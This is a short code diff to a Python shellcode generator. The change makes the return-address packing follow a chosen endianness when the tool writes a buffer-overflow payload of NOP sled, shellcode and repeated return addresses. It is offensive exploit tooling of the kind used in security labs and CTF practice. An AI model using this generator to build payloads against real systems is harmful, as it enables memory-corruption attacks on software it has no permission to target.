@@ -46,6 +46,11 @@ class GenerateShellcode:
             raise SXDK("Input into endianness is wrong.")
 
     def write_file(self, name):
+        if little in self.endianness:
+            endian_flag = "<L"
+        else:
+            endian_flag = ">L"
+        
         b = self.total_size - (4*self.num_of_addresses)
         e = open(shells[self.instruction_set.lower()], "r")
         f = open(name, "w")
@@ -53,7 +58,7 @@ class GenerateShellcode:
         b = b - sys.getsizeof(shell_data)
         total_nop = b // (sys.getsizeof(asm('nop'))//4)
 
-        f.write("{0}{1}{2}".format(asm('nop')*total_nop, shell_data, struct.pack('<L',self.starting_address)*self.num_of_addresses))
+        f.write("{0}{1}{2}".format(asm('nop')*total_nop, shell_data, struct.pack(endian_flag,self.starting_address)*self.num_of_addresses))
         #f.close()
 
 
